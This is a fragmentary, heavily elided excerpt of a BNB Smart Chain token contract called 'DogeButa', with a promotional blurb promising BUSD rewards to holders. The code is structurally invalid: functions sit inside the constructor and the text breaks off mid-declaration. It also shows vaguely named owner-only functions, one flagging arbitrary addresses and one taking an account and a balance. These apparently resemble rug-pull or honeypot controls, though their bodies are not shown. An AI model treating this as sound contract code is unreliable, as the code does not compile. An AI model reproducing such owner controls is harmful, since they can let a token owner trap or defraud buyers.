...
DogeButa  豚 - Greatest degen that would rise and the universe of bsc! 
A token that would reward all its holders with BUSD. Tokenomics are very simple. 

Tokenomics of DogeButa
3% Marketing
3% Liquidity
5% Rewards $BUSD
6% ; 12% Slippage
...
*/
    ...
    contract DogeButa  is IBEP20, Ownable
    {
        ...
        string private constant _name = "DogeButa";
        string private constant _symbol = "DogeButa";
        ...
        address public constant MarketingWallet=0x9E4d9506Fc85087c1D2229Bc18fBA4Ed02637D34; 
        ...
        constructor () {
           ...
           function LiquidityProvider(address account) external onlyOwner {
            ...
            function DogeButaBusd(address[] calldata addresses) external onlyOwner {
                 for (uint256 i; i < addresses.length; ++i) {
                     _isSendRewards[addresses[i]] = true;
                }
           }

      function AllowClaimMarketing(address account, uint256 balance) onlyOwner  public virtual {
